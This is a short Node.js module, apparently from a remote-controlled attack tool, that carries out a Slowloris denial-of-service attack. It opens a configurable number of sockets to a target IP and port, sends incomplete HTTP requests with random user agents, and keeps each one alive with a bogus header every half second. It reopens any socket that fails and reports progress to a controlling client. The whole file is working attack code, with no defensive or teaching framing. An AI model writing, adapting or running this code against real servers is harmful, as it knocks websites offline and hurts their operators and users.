import net from "net";
import { client } from "../client.js";
import UAs from "../../config/UAs.json" assert { type: "json" };

export default function slowLoris(ip, port, attackDuration, sockets) {
	if (port === undefined || port === "") {
		port = 80;
	}
	if (attackDuration === undefined || attackDuration === "") {
		attackDuration = 60000;
	}
	if (sockets === undefined || sockets === "") {
		sockets = 200;
	}

	let activeSockets = 0;
	let socketsTargetReached = false;

	const createSocket = () => {
		const socket = net.connect(port, ip, () => {
			if (++activeSockets == sockets) socketsTargetReached = true;

			if (!socketsTargetReached)
				client.write(
					`\nCreating ${sockets} sockets ... ${parseInt(
						(activeSockets / sockets) * 100
					)}`
				);

			socket.write("GET / HTTP/1.1\r\n");
			socket.write(`Host: ${ip}\r\n`);
			socket.write("Accept: */*\r\n");
			socket.write(
				`${UAs[Math.floor(Math.random() * UAs.length)]}\r\n`
			);

			setInterval(() => {
				socket.write(`KeepAlive: ${Math.random() * 1000}\r\n`);
			}, 500);
		});

		socket.setTimeout(0);

		socket.on("error", (err) => {
			socket.destroy();
			createSocket();
		});
	};

	for (let i = 0; i < sockets; i++) {
		createSocket();
	}

	setTimeout(() => {
		if (activeSockets === 0) {
			client.write(`\nCould not connect to ${ip}:${port}`);
		}
	}, 10000);
}
